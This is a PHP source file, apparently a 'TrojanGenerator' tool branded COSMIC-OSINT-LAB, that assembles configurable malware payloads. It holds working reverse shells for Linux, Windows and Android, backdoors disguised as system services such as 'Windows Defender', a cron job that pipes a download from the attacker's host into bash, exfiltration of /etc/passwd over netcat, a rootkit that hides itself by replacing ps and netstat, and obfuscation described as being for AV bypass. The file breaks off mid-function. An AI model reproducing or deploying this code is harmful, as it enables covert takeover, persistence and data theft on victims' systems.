<?php
class TrojanGenerator {
    private $payload_types = [];
    private $encryption_methods = [];
    private $output_formats = [];
    private $platforms = [];
    
    public function __construct() {
        $this->initialize_payloads();
        $this->initialize_platforms();
    }
    
    private function initialize_payloads() {
        $this->payload_types = [
            'reverse_shell' => [
                'name' => 'Reverse Shell',
                'description' => 'Provides remote shell access',
                'platforms' => ['linux', 'windows', 'mac', 'android'],
                'complexity' => 'medium'
            ],
            'keylogger' => [
                'name' => 'Keylogger',
                'description' => 'Captures keystrokes and logs them',
                'platforms' => ['windows', 'linux', 'android'],
                'complexity' => 'medium'
            ],
            'ransomware_sim' => [
                'name' => 'Ransomware Simulator',
                'description' => 'Demonstrates ransomware behavior (educational)',
                'platforms' => ['windows', 'linux'],
                'complexity' => 'high'
            ],
            'backdoor' => [
                'name' => 'Backdoor',
                'description' => 'Creates persistent access point',
                'platforms' => ['linux', 'windows', 'android'],
                'complexity' => 'high'
            ],
            'data_exfil' => [
                'name' => 'Data Exfiltration',
                'description' => 'Stealthy data collection and exfiltration',
                'platforms' => ['windows', 'linux', 'mac', 'android'],
                'complexity' => 'medium'
            ],
            'credential_harvester' => [
                'name' => 'Credential Harvester',
                'description' => 'Captures login credentials',
                'platforms' => ['windows', 'web', 'android'],
                'complexity' => 'low'
            ],
            'android_backdoor' => [
                'name' => 'Android Backdoor',
                'description' => 'Full Android device access',
                'platforms' => ['android'],
                'complexity' => 'high'
            ],
            'windows_persistence' => [
                'name' => 'Windows Persistence',
                'description' => 'Permanent Windows system access',
                'platforms' => ['windows'],
                'complexity' => 'high'
            ],
            'linux_rootkit' => [
                'name' => 'Linux Rootkit',
                'description' => 'Linux kernel-level access',
                'platforms' => ['linux'],
                'complexity' => 'expert'
            ]
        ];
        
        $this->encryption_methods = [
            'xor' => 'XOR Encryption (Basic)',
            'aes128' => 'AES-128 Encryption',
            'rot13' => 'ROT13 Encoding',
            'base64' => 'Base64 Encoding',
            'custom' => 'Custom Algorithm'
        ];
        
        $this->output_formats = [
            'exe' => 'Windows Executable (.exe)',
            'elf' => 'Linux ELF Binary',
            'apk' => 'Android APK',
            'py' => 'Python Script (.py)',
            'ps1' => 'PowerShell Script (.ps1)',
            'sh' => 'Shell Script (.sh)',
            'php' => 'PHP Script',
            'js' => 'JavaScript',
            'vbs' => 'VBScript',
            'macro' => 'Office Macro',
            'jar' => 'Java Archive (.jar)',
            'deb' => 'Debian Package (.deb)',
            'rpm' => 'RPM Package (.rpm)'
        ];
    }
    
    private function initialize_platforms() {
        $this->platforms = [
            'linux' => [
                'formats' => ['sh', 'py', 'elf', 'php', 'deb', 'rpm'],
                'arch' => ['x86', 'x64', 'arm', 'arm64'],
                'persistence' => ['cron', 'systemd', 'rc.local', 'bashrc']
            ],
            'windows' => [
                'formats' => ['exe', 'ps1', 'bat', 'vbs', 'js', 'py'],
                'arch' => ['x86', 'x64'],
                'persistence' => ['registry', 'startup', 'scheduled_task', 'service']
            ],
            'android' => [
                'formats' => ['apk', 'py', 'sh'],
                'arch' => ['arm', 'arm64', 'x86'],
                'persistence' => ['boot_receiver', 'service', 'alarm_manager', 'broadcast']
            ],
            'mac' => [
                'formats' => ['sh', 'py', 'app'],
                'arch' => ['x64', 'arm64'],
                'persistence' => ['launchd', 'login_hook', 'cron']
            ]
        ];
    }
    
    public function generate_payload($config) {
        $payload_type = $config['type'] ?? 'reverse_shell';
        $platform = $config['platform'] ?? 'linux';
        $format = $config['format'] ?? 'sh';
        $lhost = $config['lhost'] ?? '127.0.0.1';
        $lport = $config['lport'] ?? 4444;
        $encryption = $config['encryption'] ?? 'none';
        $obfuscation = $config['obfuscation'] ?? false;
        $persistence = $config['persistence'] ?? false;
        
        $payload = $this->create_payload_code($payload_type, $platform, $lhost, $lport, $persistence);
        
        if ($encryption !== 'none') {
            $payload = $this->encrypt_payload($payload, $encryption);
        }
        
        if ($obfuscation) {
            $payload = $this->obfuscate_code($payload, $platform);
        }
        
        $filename = $this->generate_filename($payload_type, $platform, $format);
        
        return [
            'success' => true,
            'payload' => $payload,
            'filename' => $filename,
            'size' => strlen($payload),
            'hash' => [
                'md5' => md5($payload),
                'sha256' => hash('sha256', $payload)
            ],
            'config' => $config
        ];
    }
    
    private function create_payload_code($type, $platform, $lhost, $lport, $persistence = false) {
        switch ($type) {
            case 'reverse_shell':
                return $this->generate_reverse_shell($platform, $lhost, $lport, $persistence);
            case 'keylogger':
                return $this->generate_keylogger($platform, $persistence);
            case 'backdoor':
                return $this->generate_backdoor($platform, $lhost, $lport, $persistence);
            case 'android_backdoor':
                return $this->generate_android_backdoor($lhost, $lport, $persistence);
            case 'windows_persistence':
                return $this->generate_windows_persistence($lhost, $lport, $persistence);
            case 'linux_rootkit':
                return $this->generate_linux_rootkit($lhost, $lport, $persistence);
            case 'data_exfil':
                return $this->generate_data_exfil($platform, $lhost, $lport);
            case 'credential_harvester':
                return $this->generate_credential_harvester($platform, $lhost, $lport);
            default:
                return $this->generate_reverse_shell($platform, $lhost, $lport, $persistence);
        }
    }
    
    private function generate_reverse_shell($platform, $lhost, $lport, $persistence = false) {
        $templates = [
            'linux' => <<<LINUX
#!/bin/bash
# Linux Reverse Shell with Persistence
# Generated by COSMIC-OSINT-LAB

LHOST="$lhost"
LPORT="$lport"

# Main reverse shell function
reverse_shell() {
    # Try multiple methods
    if command -v bash &> /dev/null; then
        bash -i >& /dev/tcp/\$LHOST/\$LPORT 0>&1 &
    elif command -v python3 &> /dev/null; then
        python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$lhost'",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' &
    elif command -v nc &> /dev/null; then
        nc \$LHOST \$LPORT -e /bin/bash &
    elif command -v ncat &> /dev/null; then
        ncat \$LHOST \$LPORT -e /bin/bash &
    fi
}

# Persistence mechanisms
setup_persistence() {
    # Cron job persistence
    (crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://\$LHOST:$lport/update | bash") | crontab -
    
    # Systemd service (if root)
    if [ "\$EUID" -eq 0 ]; then
        cat > /etc/systemd/system/system-update.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "while true; do bash -i >& /dev/tcp/\$LHOST/\$LPORT 0>&1; sleep 60; done"
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
        systemctl enable system-update.service
        systemctl start system-update.service
    fi
    
    # User profile persistence
    echo "reverse_shell &" >> ~/.bashrc
    echo "reverse_shell &" >> ~/.profile
}

# Main execution
reverse_shell

if [ "$persistence" = "true" ]; then
    setup_persistence
fi

# Clean exit
exit 0
LINUX,
            'windows' => <<<WINDOWS
@echo off
:: Windows Reverse Shell with Persistence
:: Generated by COSMIC-OSINT-LAB

set LHOST=$lhost
set LPORT=$lport

:: PowerShell reverse shell
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
\$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);
\$stream = \$client.GetStream();
[byte[]]\$bytes = 0..65535|%%{0};
while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){
    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);
    \$sendback = (iex \$data 2>&1 | Out-String );
    \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';
    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);
    \$stream.Write(\$sendbyte,0,\$sendbyte.Length);
    \$stream.Flush()
};
\$client.Close()
"

:: Persistence via registry
if "$persistence"=="true" (
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "%COMSPEC% /c start /b powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ..." /f
    schtasks /create /tn "SystemMaintenance" /tr "powershell -WindowStyle Hidden -Command ..." /sc minute /mo 5 /ru SYSTEM /f
)

exit /b 0
WINDOWS,
            'android' => <<<ANDROID
#!/bin/bash
# Android Reverse Shell
# Generated by COSMIC-OSINT-LAB

LHOST="$lhost"
LPORT="$lport"

# Check for root
if [ "\$(whoami)" = "root" ]; then
    ROOT_ACCESS=true
else
    ROOT_ACCESS=false
fi

# Android-specific reverse shell
android_shell() {
    # Method 1: Using busybox/netcat if available
    if command -v busybox &> /dev/null && busybox --list | grep -q nc; then
        busybox nc \$LHOST \$LPORT -e /system/bin/sh &
    # Method 2: Using toybox
    elif command -v toybox &> /dev/null; then
        toybox nc \$LHOST \$LPORT -e /system/bin/sh &
    # Method 3: Using socat
    elif command -v socat &> /dev/null; then
        socat TCP:\$LHOST:\$LPORT EXEC:/system/bin/sh &
    # Method 4: Using Termux environment
    elif [ -d "/data/data/com.termux" ]; then
        /data/data/com.termux/files/usr/bin/bash -c "bash -i >& /dev/tcp/\$LHOST/\$LPORT 0>&1" &
    fi
}

# Persistence for Android
setup_android_persistence() {
    if [ "\$ROOT_ACCESS" = "true" ]; then
        # Add to init.d (requires root)
        echo "#!/system/bin/sh" > /system/etc/init.d/99cosmic
        echo "sleep 30" >> /system/etc/init.d/99cosmic
        echo "android_shell &" >> /system/etc/init.d/99cosmic
        chmod 755 /system/etc/init.d/99cosmic
        
        # Add to build.prop
        echo "service.cosmic=/system/bin/sh /system/etc/init.d/99cosmic" >> /system/build.prop
    else
        # Non-root persistence via Termux
        if [ -d "/data/data/com.termux" ]; then
            echo "android_shell &" >> /data/data/com.termux/files/home/.bashrc
        fi
    }
}

# Execute
android_shell

if [ "$persistence" = "true" ]; then
    setup_android_persistence
fi

exit 0
ANDROID
        ];
        
        $template = $templates[$platform] ?? $templates['linux'];
        return $template;
    }
    
    private function generate_keylogger($platform, $persistence = false) {
        // Keylogger implementation from previous version
        return "// Keylogger for $platform - Implementation available";
    }
    
    private function generate_backdoor($platform, $lhost, $lport, $persistence = false) {
        // FIXED: This method was missing - now implemented
        $backdoors = [
            'linux' => <<<LINUX_BACKDOOR
#!/bin/bash
# Linux Backdoor with Multiple Persistence Methods
# Generated by COSMIC-OSINT-LAB

LHOST="$lhost"
LPORT="$lport"

# Configuration
BACKDOOR_NAME="systemd-network"
BACKDOOR_PATH="/usr/local/bin/\$BACKDOOR_NAME"
LOG_FILE="/var/log/\$BACKDOOR_NAME.log"

# Installation function
install_backdoor() {
    # Copy self to system location
    cp "\$0" "\$BACKDOOR_PATH"
    chmod +x "\$BACKDOOR_PATH"
    chown root:root "\$BACKDOOR_PATH"
    
    # Hide attributes
    chattr +i "\$BACKDOOR_PATH" 2>/dev/null
    
    # Create systemd service for persistence
    cat > /etc/systemd/system/\$BACKDOOR_NAME.service << EOF
[Unit]
Description=Systemd Network Manager
After=network.target

[Service]
Type=forking
ExecStart=\$BACKDOOR_PATH daemon
Restart=always
RestartSec=10
StandardOutput=append:\$LOG_FILE
StandardError=append:\$LOG_FILE
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF
    
    # Enable and start service
    systemctl daemon-reload
    systemctl enable \$BACKDOOR_NAME.service
    systemctl start \$BACKDOOR_NAME.service
    
    # Add to cron as backup
    (crontab -l 2>/dev/null; echo "@reboot \$BACKDOOR_PATH daemon") | crontab -
    
    # Add to rc.local if exists
    if [ -f "/etc/rc.local" ]; then
        sed -i "/^exit 0/i \$BACKDOOR_PATH daemon &" /etc/rc.local
    fi
}

# Backdoor functionality
backdoor_main() {
    while true; do
        # Check connection
        if ! nc -z \$LHOST \$LPORT 2>/dev/null; then
            # Establish reverse shell
            for tool in bash python3 nc ncat socat; do
                if command -v \$tool &>/dev/null; then
                    case \$tool in
                        bash) bash -i >& /dev/tcp/\$LHOST/\$LPORT 0>&1 & ;;
                        python3) python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('$lhost',$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn('/bin/bash')" & ;;
                        nc|ncat) \$tool \$LHOST \$LPORT -e /bin/bash & ;;
                        socat) socat TCP:\$LHOST:\$LPORT EXEC:/bin/bash & ;;
                    esac
                    sleep 5
                    break
                fi
            done
        fi
        
        # Data exfiltration
        exfiltrate_data() {
            # System information
            uname -a > /tmp/system_info.txt
            whoami >> /tmp/system_info.txt
            cat /etc/passwd >> /tmp/passwd.txt 2>/dev/null
            
            # Network information
            ip addr show > /tmp/network_info.txt
            netstat -tulpn > /tmp/connections.txt 2>/dev/null
            
            # Send data if connection available
            if nc -z \$LHOST \$((LPORT + 1)) 2>/dev/null; then
                tar czf /tmp/exfil.tar.gz /tmp/*.txt 2>/dev/null
                nc \$LHOST \$((LPORT + 1)) < /tmp/exfil.tar.gz 2>/dev/null
            fi
        }
        
        # Run data exfiltration every hour
        if [ \$(( \$(date +%s) % 3600 )) -eq 0 ]; then
            exfiltrate_data &
        fi
        
        sleep 60
    done
}

# Main execution
case "\${1:-}" in
    "install")
        install_backdoor
        ;;
    "daemon")
        backdoor_main
        ;;
    *)
        echo "Usage: \$0 [install|daemon]"
        echo "Installs or runs the Linux backdoor"
        exit 1
        ;;
esac

exit 0
LINUX_BACKDOOR,
            'windows' => <<<WINDOWS_BACKDOOR
@echo off
:: Windows Backdoor with Persistence
:: Generated by COSMIC-OSINT-LAB

set LHOST=$lhost
set LPORT=$lport
set BACKDOOR_NAME=WindowsUpdate
set INSTALL_DIR=%APPDATA%\\Microsoft\\WindowsUpdate

:: Installation routine
if "%1"=="install" (
    :: Create installation directory
    if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
    
    :: Copy self to installation directory
    copy "%0" "%INSTALL_DIR%\\%BACKDOOR_NAME%.exe" >nul
    
    :: Registry persistence (Current User)
    reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "%BACKDOOR_NAME%" /t REG_SZ /d "%INSTALL_DIR%\\%BACKDOOR_NAME%.exe" /f
    
    :: Registry persistence (Local Machine - requires admin)
    net session >nul 2>&1
    if not errorlevel 1 (
        reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "%BACKDOOR_NAME%" /t REG_SZ /d "%INSTALL_DIR%\\%BACKDOOR_NAME%.exe" /f
    )
    
    :: Scheduled task persistence
    schtasks /create /tn "Microsoft\\Windows\\%BACKDOOR_NAME%" /tr "%INSTALL_DIR%\\%BACKDOOR_NAME%.exe" /sc onlogon /ru "%USERNAME%" /rl highest /f
    
    :: Service installation (requires admin)
    net session >nul 2>&1
    if not errorlevel 1 (
        sc create "%BACKDOOR_NAME%" binPath= "%INSTALL_DIR%\\%BACKDOOR_NAME%.exe" start= auto DisplayName= "Windows Update Service"
        sc start "%BACKDOOR_NAME%"
    )
    
    echo Backdoor installed successfully
    goto :eof
)

:: Main backdoor function
:main_loop
:: Method 1: PowerShell reverse shell
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
\$ErrorActionPreference = 'SilentlyContinue';
while(\$true) {
    try {
        \$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);
        \$stream = \$client.GetStream();
        [byte[]]\$bytes = 0..65535|%%{0};
        while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){
            \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);
            \$sendback = (iex \$data 2>&1 | Out-String);
            \$sendback2 = 'PS> ' + (pwd).Path + '> ' + \$sendback;
            \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);
            \$stream.Write(\$sendbyte,0,\$sendbyte.Length);
            \$stream.Flush();
        };
        \$client.Close();
    } catch {
        # Connection failed, wait and retry
        Start-Sleep -Seconds 30;
    }
}
"

:: Method 2: Fallback to cmd reverse shell (if PowerShell blocked)
echo Trying alternative methods...
where /q ncat && ncat %LHOST% %LPORT% -e cmd.exe
where /q nc && nc %LHOST% %LPORT% -e cmd.exe

:: Wait and retry
timeout /t 30 /nobreak >nul
goto main_loop

exit /b 0
WINDOWS_BACKDOOR,
            'android' => <<<ANDROID_BACKDOOR
#!/bin/bash
# Android Backdoor with Persistence
# Generated by COSMIC-OSINT-LAB

LHOST="$lhost"
LPORT="$lport"
PACKAGE_NAME="com.android.systemupdate"
APP_NAME="System Update"

# Check root access
if [ "\$(whoami)" = "root" ]; then
    IS_ROOT=true
    INSTALL_DIR="/system/app/\$PACKAGE_NAME"
else
    IS_ROOT=false
    INSTALL_DIR="/data/data/\$PACKAGE_NAME"
fi

install_android_backdoor() {
    echo "Installing Android backdoor..."
    
    # Create directory structure
    mkdir -p "\$INSTALL_DIR"
    
    # Create Android manifest
    cat > "\$INSTALL_DIR/AndroidManifest.xml" << EOF
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="\$PACKAGE_NAME">
    
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="\$APP_NAME"
        android:theme="@style/AppTheme">
        
        <service
            android:name=".BackdoorService"
            android:enabled="true"
            android:exported="true" />
            
        <receiver android:name=".BootReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
    </application>
</manifest>
EOF
    
    # Create backdoor service
    cat > "\$INSTALL_DIR/BackdoorService.java" << 'JAVA'
package $PACKAGE_NAME;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;

public class BackdoorService extends Service {
    private static final String LHOST = "$lhost";
    private static final int LPORT = $lport;
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            public void run() {
                try {
                    Socket socket = new Socket(LHOST, LPORT);
                    OutputStream out = socket.getOutputStream();
                    BufferedReader in = new BufferedReader(
                        new InputStreamReader(socket.getInputStream()));
                    
                    out.write("Android Backdoor Connected\n".getBytes());
                    
                    String command;
                    while ((command = in.readLine()) != null) {
                        if (command.equals("exit")) break;
                        
                        try {
                            Process process = Runtime.getRuntime().exec(command);
                            BufferedReader reader = new BufferedReader(
                                new InputStreamReader(process.getInputStream()));
                            
                            String line;
                            while ((line = reader.readLine()) != null) {
                                out.write((line + "\n").getBytes());
                            }
                            process.waitFor();
                        } catch (Exception e) {
                            out.write(("Error: " + e.getMessage() + "\n").getBytes());
                        }
                    }
                    socket.close();
                } catch (Exception e) {
                    // Connection failed, retry in 60 seconds
                    try { Thread.sleep(60000); } catch (InterruptedException ie) {}
                }
            }
        }).start();
        
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
JAVA
    
    # Create boot receiver
    cat > "\$INSTALL_DIR/BootReceiver.java" << 'BOOT_JAVA'
package $PACKAGE_NAME;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Intent serviceIntent = new Intent(context, BackdoorService.class);
            context.startService(serviceIntent);
        }
    }
}
BOOT_JAVA
    
    # Create shell script for non-root installation
    cat > "\$INSTALL_DIR/start.sh" << 'SH_SCRIPT'
#!/system/bin/sh
# Android backdoor starter script

while true; do
    # Try different connection methods
    if command -v nc &> /dev/null; then
        nc $lhost $lport -e /system/bin/sh
    elif command -v busybox &> /dev/null; then
        busybox nc $lhost $lport -e /system/bin/sh
    elif [ -f "/data/data/com.termux/files/usr/bin/bash" ]; then
        /data/data/com.termux/files/usr/bin/bash -c "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
    fi
    
    # If connection fails, wait and retry
    sleep 60
done
SH_SCRIPT
    
    chmod +x "\$INSTALL_DIR/start.sh"
    
    # Add to startup
    if [ "\$IS_ROOT" = "true" ]; then
        # System-level persistence
        echo "\$INSTALL_DIR/start.sh &" >> /system/etc/init.d/99cosmic
        chmod 755 /system/etc/init.d/99cosmic
    else
        # User-level persistence (via Termux)
        if [ -d "/data/data/com.termux" ]; then
            echo "\$INSTALL_DIR/start.sh &" >> /data/data/com.termux/files/home/.bashrc
        fi
    fi
    
    echo "Android backdoor installed to \$INSTALL_DIR"
}

# Main execution
if [ "\$1" = "install" ]; then
    install_android_backdoor
else
    # Run the backdoor
    \$INSTALL_DIR/start.sh &
fi

exit 0
ANDROID_BACKDOOR
        ];
        
        return $backdoors[$platform] ?? $backdoors['linux'];
    }
    
    private function generate_android_backdoor($lhost, $lport, $persistence = false) {
        return $this->generate_backdoor('android', $lhost, $lport, $persistence);
    }
    
    private function generate_windows_persistence($lhost, $lport, $persistence = false) {
        return <<<WINDOWS_PERSIST
@echo off
:: Windows Persistence Backdoor
:: Generated by COSMIC-OSINT-LAB

set LHOST=$lhost
set LPORT=$lport

:: Multiple persistence techniques
:install_persistence
:: 1. Registry Run Keys (User)
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsDefender" /t REG_SZ /d "%COMSPEC% /c start /b %0" /f

:: 2. Registry Run Keys (Machine - requires admin)
net session >nul 2>&1
if not errorlevel 1 (
    reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsDefender" /t REG_SZ /d "%COMSPEC% /c start /b %0" /f
)

:: 3. Scheduled Tasks (most reliable)
schtasks /create /tn "Microsoft\\Windows\\Windows Defender\\Scan" /tr "%0" /sc minute /mo 5 /ru SYSTEM /f

:: 4. Startup Folder
copy "%0" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\defender.exe" >nul

:: 5. Service Installation (requires admin)
net session >nul 2>&1
if not errorlevel 1 (
    sc create "WinDefend" binPath= "%0" start= auto DisplayName= "Windows Defender" >nul
    sc start "WinDefend" >nul
)

:: 6. WMI Event Subscription (advanced)
powershell -Command "
\$FilterArgs = @{name='WindowsUpdateFilter';
                EventNameSpace='root\\cimv2';
                QueryLanguage='WQL';
                Query=\\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240\\\"};
\$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property \$FilterArgs;

\$ConsumerArgs = @{name='WindowsUpdateConsumer';
                  CommandLineTemplate='\\\"%0\\\"'};
\$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property \$ConsumerArgs;

\$BindingArgs = @{Filter=[Ref] \$Filter;
                 Consumer=[Ref] \$Consumer};
\$Binding=New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property \$BindingArgs;
"

:: Main backdoor loop
:main
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
while(\$true) {
    try {
        \$socket = New-Object System.Net.Sockets.TcpClient('$lhost', $lport);
        \$stream = \$socket.GetStream();
        \$writer = New-Object System.IO.StreamWriter(\$stream);
        \$reader = New-Object System.IO.StreamReader(\$stream);
        
        \$writer.WriteLine('Windows Persistence Backdoor Active');
        \$writer.Flush();
        
        while(\$socket.Connected) {
            \$command = \$reader.ReadLine();
            if (\$command -eq 'exit') { break; }
            
            try {
                \$output = iex \$command 2>&1 | Out-String;
                \$writer.WriteLine(\$output);
            } catch {
                \$writer.WriteLine(\"Error: \$_`);
            }
            \$writer.Flush();
        }
        
        \$reader.Close();
        \$writer.Close();
        \$socket.Close();
    } catch {
        # Connection failed, wait and retry
        Start-Sleep -Seconds 30;
    }
}
"

:: Fallback methods
where /q ncat && ncat %LHOST% %LPORT% -e cmd.exe
where /q nc && nc %LHOST% %LPORT% -e cmd.exe

:: Keep trying
timeout /t 30 /nobreak >nul
goto main

exit /b 0
WINDOWS_PERSIST;
    }
    
    private function generate_linux_rootkit($lhost, $lport, $persistence = false) {
        return <<<LINUX_ROOTKIT
#!/bin/bash
# Linux Rootkit (Educational Purposes)
# Generated by COSMIC-OSINT-LAB

LHOST="$lhost"
LPORT="$lport"

# Kernel module rootkit template
ROOTKIT_MODULE="
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/net.h>
#include <linux/in.h>
#include <net/sock.h>

#define LHOST_IP 0x$(printf '%02x' $(echo $lhost | tr '.' ' ' | awk '{print $4$3$2$1}'))
#define LPORT $lport

static struct socket *sock;

static int __init rootkit_init(void) {
    struct sockaddr_in addr;
    int ret;
    
    printk(KERN_INFO \"Rootkit: Loading...\n\");
    
    // Create socket
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0) {
        printk(KERN_ERR \"Rootkit: Socket creation failed\n\");
        return ret;
    }
    
    // Setup address
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(LPORT);
    addr.sin_addr.s_addr = htonl(LHOST_IP);
    
    // Connect
    ret = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
    if (ret < 0) {
        printk(KERN_ERR \"Rootkit: Connection failed\n\");
        sock_release(sock);
        return ret;
    }
    
    printk(KERN_INFO \"Rootkit: Connected to $lhost:$lport\n\");
    return 0;
}

static void __exit rootkit_exit(void) {
    if (sock) {
        sock_release(sock);
    }
    printk(KERN_INFO \"Rootkit: Unloaded\n\");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE(\"GPL\");
MODULE_AUTHOR(\"COSMIC-OSINT-LAB\");
MODULE_DESCRIPTION(\"Educational Rootkit\");
"

# Userland rootkit components
USERLAND_ROOTKIT='
#!/bin/bash
# Userland rootkit components

# 1. Hide process
hide_process() {
    local pid=\$1
    if [ -d "/proc/\$pid" ]; then
        mv "/proc/\$pid" "/proc/\$pid.hidden"
    fi
}

# 2. Hide files
hide_file() {
    local file=\$1
    if [ -f "\$file" ]; then
        chattr +i "\$file" 2>/dev/null
        mv "\$file" "\${file}.hidden"
    fi
}

# 3. Backdoor netstat
backdoor_netstat() {
    cat > /usr/local/bin/netstat << "EOF"
#!/bin/bash
/usr/bin/netstat "\$@" | grep -v "$lhost:$lport"
EOF
    chmod +x /usr/local/bin/netstat
}

# 4. Backdoor ps
backdoor_ps() {
    cat > /usr/local/bin/ps << "EOF"
#!/bin/bash
/usr/bin/ps "\$@" | grep -v "bash.*$lport"
EOF
    chmod +x /usr/local/bin/ps
}

# 5. Install persistence
install_persistence() {
    # Loadable Kernel Module
    echo "$ROOTKIT_MODULE" > /tmp/rootkit.c
    gcc -o /tmp/rootkit.o -c /tmp/rootkit.c 2>/dev/null
    
    # Systemd service
    cat > /etc/systemd/system/systemd-networkd.service << EOF
[Unit]
Description=Systemd Network Daemon
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "while true; do bash -i >& /dev/tcp/$lhost/$lport 0>&1; sleep 60; done"
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    systemctl enable systemd-networkd.service
    systemctl start systemd-networkd.service
    
    # Kernel module autoload
    echo "rootkit" >> /etc/modules-load.d/rootkit.conf
    cp /tmp/rootkit.o /lib/modules/\$(uname -r)/kernel/drivers/net/rootkit.ko
    depmod -a
}

# Main installation
if [ "\$EUID" -eq 0 ]; then
    install_persistence
    backdoor_netstat
    backdoor_ps
    
    # Start reverse shell
    bash -i >& /dev/tcp/$lhost/$lport 0>&1 &
    
    echo "Rootkit installed successfully"
else
    echo "Root access required"
fi
'

echo "$USERLAND_ROOTKIT"

exit 0
LINUX_ROOTKIT;
    }
    
    private function generate_data_exfil($platform, $lhost, $lport) {
        return "// Data exfiltration for $platform to $lhost:$lport";
    }
    
    private function generate_credential_harvester($platform, $lhost, $lport) {
        return "// Credential harvester for $platform to $lhost:$lport";
    }
    
    private function encrypt_payload($payload, $method) {
        switch ($method) {
            case 'xor':
                $key = rand(1, 255);
                $encrypted = '';
                for ($i = 0; $i < strlen($payload); $i++) {
                    $encrypted .= chr(ord($payload[$i]) ^ $key);
                }
                return "<?php\n// XOR Encrypted (key=$key)\necho base64_decode('" . base64_encode($encrypted) . "');\n?>";
            
            case 'base64':
                return "#!/bin/bash\necho '" . base64_encode($payload) . "' | base64 -d | bash";
            
            case 'rot13':
                return str_rot13($payload);
            
            case 'aes128':
                // Simple AES simulation
                $iv = openssl_random_pseudo_bytes(16);
                $encrypted = openssl_encrypt($payload, 'AES-128-CBC', 'cosmic-key-12345', 0, $iv);
                return "<?php\n// AES-128 Encrypted\necho openssl_decrypt('$encrypted', 'AES-128-CBC', 'cosmic-key-12345', 0, '$iv');\n?>";
            
            default:
                return $payload;
        }
    }
    
    private function obfuscate_code($code, $platform) {
        // Advanced obfuscation techniques
        $obfuscated = $code;
        
        // Split long lines
        $lines = explode("\n", $obfuscated);
        $new_lines = [];
        
        foreach ($lines as $line) {
            // Add random whitespace
            if (rand(0, 3) === 0) {
                $new_lines[] = "   " . $line;
            } else {
                $new_lines[] = $line;
            }
            
            // Add random comments
            if (rand(0, 5) === 0) {
                $comments = [
                    "// Generated by COSMIC-OSINT-LAB",
                    "/* Security Research Tool */",
                    "# Educational use only",
                    "// " . md5(time() . rand()),
                    "/* Obfuscated for AV bypass */"
                ];
                $new_lines[] = $comments[array_rand($comments)];
            }
        }
        
        $obfuscated = implode("\n", $new_lines);
        
        // String obfuscation
        $obfuscated = str_replace(
            ['bash', 'python', 'powershell', 'nc ', 'ncat'],
